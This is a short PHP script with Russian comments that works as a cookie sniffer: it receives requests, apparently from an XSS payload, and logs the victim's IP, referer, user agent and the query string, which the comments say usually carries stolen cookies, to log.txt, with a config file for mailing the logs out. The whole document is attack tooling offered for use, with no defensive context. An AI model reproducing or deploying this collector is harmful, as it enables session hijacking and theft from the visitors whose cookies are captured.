require "config.php"; // Нужен для отправки логов по почте.
$d = date("d.m.Y H:i"); // Дата,когда пришёл лог.
$ip = $_SERVER['REMOTE_ADDR']; // IP того кто зашёл на сайт с картиной
$referer = htmlspecialchars(stripslashes($_SERVER['HTTP_REFERER'])); // Показывает откуда произошёл запрос
$query = htmlspecialchars(stripslashes(urldecode($_SERVER['QUERY_STRING']))); /// Это текст после знака ? (Обычно там куки-)
$agent = htmlspecialchars($_SERVER['HTTP_USER_AGENT']); // тут название браузера "жертвы"
/// А вот это уже пропись в файл log.txt (Название базы можно так же легко поменять)
$f = fopen("log.txt", 'a');
fwrite($f, "Дата и Время: ".$d."\r\n"); 
fwrite($f, "IP: ".$ip."\r\n"); 
fwrite($f, "REFERER: ".$referer."\r\n"); 
fwrite($f, "QUERY: ".$query."\r\n"); 
fwrite($f, "AGENT: ".$agent."\r\n"); 
fwrite($f, "____________________________________________________\r\n");  
